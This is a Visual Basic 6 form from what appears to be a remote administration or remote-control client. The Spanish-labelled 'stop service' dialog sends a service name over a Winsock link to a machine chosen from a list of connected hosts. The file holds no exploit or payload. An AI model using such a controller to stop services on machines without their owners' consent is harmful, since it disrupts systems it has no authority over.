VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Begin VB.Form services 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Detener servicio"
   ClientHeight    =   945
   ClientLeft      =   795
   ClientTop       =   3270
   ClientWidth     =   2400
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   945
   ScaleWidth      =   2400
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command1 
      Caption         =   "&Cerrar"
      Height          =   255
      Left            =   1560
      TabIndex        =   2
      Top             =   600
      Width           =   735
   End
   Begin VB.CommandButton Parar 
      Caption         =   "&Detener"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   600
      Width           =   735
   End
   Begin VB.TextBox Text9 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   2175
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   2640
      OleObjectBlob   =   "services.frx":0000
      Top             =   360
   End
End
Attribute VB_Name = "services"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim vIndex As Variant
Dim Index_n As Integer

Private Sub Command1_Click()
Unload Me
End Sub

Private Sub Form_Activate()
Text9.SetFocus
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

Skin1.LoadSkin App.path & "\sk\skin.skn"
Skin1.ApplySkin services.hwnd
End Sub

Private Sub Parar_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Form1.Winsock1(vIndex(0)).SendData "ser" & Text9.Text
    Text9 = ""
    Text9.SetFocus
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub
